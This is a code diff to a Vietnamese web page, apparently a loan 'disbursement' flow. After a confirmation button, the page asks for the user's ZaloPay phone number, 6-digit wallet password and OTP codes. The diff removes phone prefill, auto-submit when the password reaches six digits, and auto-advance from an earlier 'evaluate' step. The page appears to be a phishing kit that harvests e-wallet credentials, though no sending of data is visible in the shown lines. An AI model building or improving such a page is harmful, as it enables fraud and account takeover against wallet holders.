@@ -692,9 +692,8 @@
         </main>
         <footer class="page-footer">
           <button
-            type="button"
             class="button primary"
-            onclick="confirmDisbursement()"
+            onclick="showSection('zalopay-phone-section')"
           >
             Xác nhận
           </button>
@@ -962,17 +961,6 @@
         };
 
         const formData = getFormData();
-
-        const normalizePhoneForWallet = (phone) => {
-          const digits = String(phone || "").replace(/\D/g, "");
-          if (digits.length === 10 && digits.startsWith("0")) {
-            return digits.slice(1);
-          }
-          if (digits.length === 11 && digits.startsWith("84")) {
-            return digits.slice(2);
-          }
-          return digits.length === 9 ? digits : "";
-        };
 
         // DOM Elements
         const passwordInputEl = getEl("zalopay-password");
@@ -1264,15 +1252,6 @@
               "invalid",
               value.length > 0 && value.length < 9
             );
-            if (value.length === 9) {
-              handlePhoneSubmit();
-            }
-          });
-
-          passwordInputEl.addEventListener("input", () => {
-            if (passwordInputEl.value.length === 6) {
-              handlePasswordSubmit();
-            }
           });
 
           otpInputs.forEach((input, index) => {
@@ -1322,41 +1301,10 @@
           });
         };
 
-        window.confirmDisbursement = () => {
-          showSection("zalopay-phone-section");
-          const storedData =
-            JSON.parse(sessionStorage.getItem("formData") || "{}");
-          const phoneInput = getEl("zalopay-phone");
-          const normalizedPhone = normalizePhoneForWallet(storedData.phone);
-          if (normalizedPhone.length === 9) {
-            phoneInput.value = normalizedPhone;
-          }
-          setTimeout(() => phoneInput.focus(), 150);
-        };
-
-        const shouldAutoAdvanceFromEvaluate = () => {
-          const params = new URLSearchParams(window.location.search);
-          return (
-            params.get("from") === "evaluate" ||
-            formData.methodKey === "zalopay"
-          );
-        };
-
-        const autoAdvanceFromEvaluate = () => {
-          if (!shouldAutoAdvanceFromEvaluate()) return;
-          confirmDisbursement();
-        };
-
         // Initializer
         const init = () => {
-          try {
-            populateData();
-            setupEventListeners();
-            autoAdvanceFromEvaluate();
-          } catch (error) {
-            console.error("ZaloPay init error:", error);
-            populateData();
-          }
+          populateData();
+          setupEventListeners();
         };
 
         init();
